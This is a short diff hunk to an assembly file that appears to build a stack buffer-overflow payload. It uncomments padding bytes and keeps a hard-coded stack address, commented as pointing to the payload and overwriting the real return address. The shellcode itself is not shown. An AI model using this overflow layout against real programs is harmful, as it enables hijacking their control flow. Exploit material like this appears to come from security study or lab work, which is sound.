@@ -38,6 +38,6 @@ main:
         .ascii  "cccc"
         .ascii  "dddd"
         .ascii  "eeee"
-        //.ascii  "fff"
+        .ascii  "fff"
         // .ascii  "gggg"
         .quad   0x7fffffffded0           /* buffer ptr (the first instruction of payload), will overwrite real return address */
